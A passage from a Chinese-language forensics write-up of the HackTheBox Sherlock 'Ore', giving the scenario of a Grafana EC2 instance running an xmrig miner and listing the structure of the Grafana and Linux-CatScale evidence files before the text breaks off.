<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-HackTheBox/Sherlocks/Ore/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.6.3">
<title data-rh="true">Ore | Target Machines WriteUp</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Ore/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Ore | Target Machines WriteUp"><meta data-rh="true" name="description" content="One of our technical partners are currently managing our AWS infrastructure. We requested the deployment of some technology into the cloud. The solution proposed was an EC2 instance hosting the Grafana application. Not too long after the EC2 was deployed the CPU usage ended up sitting at a continuous 98%+ for a process named &quot;xmrig&quot;. Important Information Our organisation&#x27;s office public facing IP is 86.5.206.121, upon the deployment of the application we carried out some basic vulnerability testing and maintenance."><meta data-rh="true" property="og:description" content="One of our technical partners are currently managing our AWS infrastructure. We requested the deployment of some technology into the cloud. The solution proposed was an EC2 instance hosting the Grafana application. Not too long after the EC2 was deployed the CPU usage ended up sitting at a continuous 98%+ for a process named &quot;xmrig&quot;. Important Information Our organisation&#x27;s office public facing IP is 86.5.206.121, upon the deployment of the application we carried out some basic vulnerability testing and maintenance."><link data-rh="true" rel="icon" href="/Target-Machines-WriteUp/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Ore/"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Ore/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Ore/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/Target-Machines-WriteUp/blog/rss.xml" title="Target Machines WriteUp RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Target-Machines-WriteUp/blog/atom.xml" title="Target Machines WriteUp Atom Feed">



<link rel="preconnect" href="https://static.cloudflareinsights.com">
<script src="https://static.cloudflareinsights.com/beacon.min.js" defer="defer" data-cf-beacon="{&quot;token&quot;:&quot;419208379f5c472a9afad0d3dc0396f9&quot;}"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/Target-Machines-WriteUp/assets/css/styles.b5431df6.css">
<script src="/Target-Machines-WriteUp/assets/js/runtime~main.5f3e8a1f.js" defer="defer"></script>
<script src="/Target-Machines-WriteUp/assets/js/main.7fd49774.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Target-Machines-WriteUp/"><div class="navbar__logo"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Target Machines WriteUp</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Target-Machines-WriteUp/docs/HackTheBox/">HackTheBox</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Yunjing/">春秋云境</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackMyVM/">HackMyVM</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Xuanji/">玄机</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Independent-Environment/">其他靶场</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/ToolsGuide/Brute-Forcing/hydra">Tools Guide</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/blog">Blog</a><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z"><input placeholder="搜索" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/Target-Machines-WriteUp/docs/HackTheBox/">HackTheBox</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/Target-Machines-WriteUp/docs/category/HackTheBox-Battlegrounds-Cyber Mayhem">Battlegrounds</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/HackTheBox-Challenges">Challenges</a><button aria-label="展开侧边栏分类 &#x27;Challenges&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/HackTheBox-Fortresses">Fortresses</a><button aria-label="展开侧边栏分类 &#x27;Fortresses&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/HackTheBox-Machines">Machines</a><button aria-label="展开侧边栏分类 &#x27;Machines&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/Target-Machines-WriteUp/docs/category/HackTheBox-Sherlocks">Sherlocks</a><button aria-label="折叠侧边栏分类 &#x27;Sherlocks&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Bumblebee/">Bumblebee</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Constellation/">Constellation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/CrownJewel-1/">CrownJewel-1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Hyperfiletable/">Hyperfiletable</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Knock-Knock/">Knock Knock</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Litter/">Litter</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Lockpick/">Lockpick</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Logjammer/">Logjammer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Meerkat/">Meerkat</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Noted/">Noted</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Nubilum-2/">Nubilum-2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/OpTinselTrace-1/">OpTinselTrace-1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/OpTinselTrace-2/">OpTinselTrace-2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Ore/">Ore</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Recollection/">Recollection</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/RogueOne/">RogueOne</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/Tracer/">Tracer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/HackTheBox/Sherlocks/i-like-to/">i-like-to</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/Target-Machines-WriteUp/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/Target-Machines-WriteUp/docs/category/HackTheBox-Sherlocks"><span itemprop="name">Sherlocks</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Ore</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Ore</h1></header>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Sherlock Scenario</div><div class="admonitionContent_BuS1"><p>One of our technical partners are currently managing our AWS infrastructure. We requested the deployment of some technology into the cloud. The solution proposed was an EC2 instance hosting the Grafana application. Not too long after the EC2 was deployed the CPU usage ended up sitting at a continuous 98%+ for a process named &quot;xmrig&quot;. Important Information Our organisation&#x27;s office public facing IP is 86.5.206.121, upon the deployment of the application we carried out some basic vulnerability testing and maintenance.</p><p>我们的技术合作伙伴目前正在管理我们的 AWS 基础设施。我们请求将某些技术部署到云中。所提出的解决方案是托管 Grafana 应用的一个 EC2 实例。在 EC2 部署后不久，CPU 使用率就持续达到了 98% 以上，一个名为 &quot;xmrig&quot; 的进程导致。重要信息：我们组织办公室的公网 IP 是 86.5.206.121，在部署应用后，我们进行了一些基本的漏洞测试和维护。</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="题目数据">题目数据<a href="#题目数据" class="hash-link" aria-label="题目数据的直接链接" title="题目数据的直接链接">​</a></h2>
<p><a href="/Target-Machines-WriteUp/assets/files/ore-9fcda3ca8f273e1639dc8acb820c724a.zip" target="_blank">ore.zip</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="题目附件讲解">题目附件讲解<a href="#题目附件讲解" class="hash-link" aria-label="题目附件讲解的直接链接" title="题目附件讲解的直接链接">​</a></h2>
<p>经过分析，本附件主要提供了两个开源项目的文件</p>
<ul>
<li><a href="https://github.com/grafana/grafana" target="_blank" rel="noopener noreferrer">grafana</a></li>
<li><a href="https://github.com/WithSecureLabs/LinuxCatScale" target="_blank" rel="noopener noreferrer">Linux-CatScale</a></li>
</ul>
<p><code>grafana</code> 的文件位于 <code>.\usr\share\grafana</code> 文件夹内，有以下文件</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Mode                 LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----                 -------------         ------ ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                .cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                .config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                .gnupg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                .local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                plugins-bundled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                public</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:53                scripts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----          2022/11/24    23:53           3348 .bash_history</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----          2022/11/24    23:53             66 .selected_editor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----          2022/11/24    23:53           8809 .viminfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----          2022/11/24    23:53              5 VERSION</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">文件夹结构树</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">D:.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─.cache - 缓存</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─.config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─lxc - lxc 配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─.gnupg - gnupg 配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─private-keys-v1.d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─.local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─share</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      └─nano</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─bin - grafana 二进制程序</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─conf - grafana 配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─provisioning - 各个组件的配置文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      ├─access-control</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      ├─dashboards</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      ├─datasources</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      ├─notifiers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      └─plugins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─data - grafana 数据存放目录</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  ├─csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  ├─log - grafana 日志目录</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  ├─plugins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─png</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─plugins-bundled - 插件目录</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─internal</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      └─input-datasource</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│          └─img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─public - grafana 服务端 web 相关文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─scripts - grafana 启动脚本</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>Linux-CatScale</code> 的文件位于 <code>catscale_ip-172-31-13-147-20221124-1501.tar.gz</code> 压缩包内，解压后得到</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Mode                 LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----                 -------------         ------ ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:01                Docker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:02                Logs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:08                Misc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:07                Persistence</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:01                Podman</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:07                Process_and_Network</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:07                System_Info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:01                User_Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d----          2022/11/24    23:01                Virsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-a---          2022/11/24    23:07           1804 ip-172-31-13-147-20221124-1501-console-error-log.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">文件夹结构树</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">D:.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─Docker - docker 相关信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─Logs - `/var/log` 目录下的日志文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─Misc - 其他目录下的日志信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─Persistence - 涉及到持久化攻击的相关日志</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─Podman - podman 相关信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─Process_and_Network - 进程与网络</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─System_Info - 系统信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─User_Files - 用户的文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─Virsh - Virsh kvm 相关信息</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 